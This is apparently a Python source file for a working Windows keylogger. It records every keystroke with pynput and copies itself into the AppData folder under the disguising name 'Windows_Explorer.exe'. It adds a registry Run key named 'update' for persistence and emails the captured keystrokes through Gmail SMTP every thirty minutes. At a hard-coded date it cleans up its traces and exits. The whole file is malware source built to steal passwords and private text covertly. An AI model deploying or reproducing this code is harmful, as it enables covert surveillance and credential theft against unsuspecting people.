import pynput.keyboard
import threading
import smtplib
import datetime
import subprocess
import os , sys
import shutil
import datetime

#NOTe: DONT FORGET TO CHANGE DATE AND TIME

#email and password will go here (works only on gmail account)
email=""  
password=""

log="key logger start"

def process(key):
    global log
    try:
        log=log+str(key.char)
    except AttributeError:
        if key==key.space:
            log=log+" "
        else:
            log=log+" + "+str(key)
def run_persistence():
    back_file=os.environ["appdata"] + "\\Windows_Explorer.exe"
    if not os.path.exists(back_file):
        shutil.copyfile(sys.executable,back_file)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "'+back_file+'"',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

def report():
    global log
    # print(log)
    send_mail(email,password,log)
    log=""
    timer=threading.Timer(1800,report)
    timer2=threading.Timer(1,check_time)
    timer2.start()
    timer.start()
def check_time():
    print("checking")
    if str(datetime.date.today())=='2019-10-26' and str(datetime.datetime.now().hour)=='23' and str(datetime.datetime.now().minute)=='30':
        print("in")
        send_mail(email,password,log)
        back_file=os.environ["appdata"] + "\\Windows_Explorer.exe"
        if os.path.exists(back_file):
            subprocess.call('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /f',shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
            os.remove(back_file)
        os._exit(1)
    

def send_mail(email,password,message):
    while True:
        try:
            server=smtplib.SMTP("smtp.gmail.com",587)
            break
        except Exception:
            print("exception")
            continue
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()



run_persistence()
check_time()
key_listen=pynput.keyboard.Listener(on_press=process)
with key_listen:
    report()
    key_listen.join()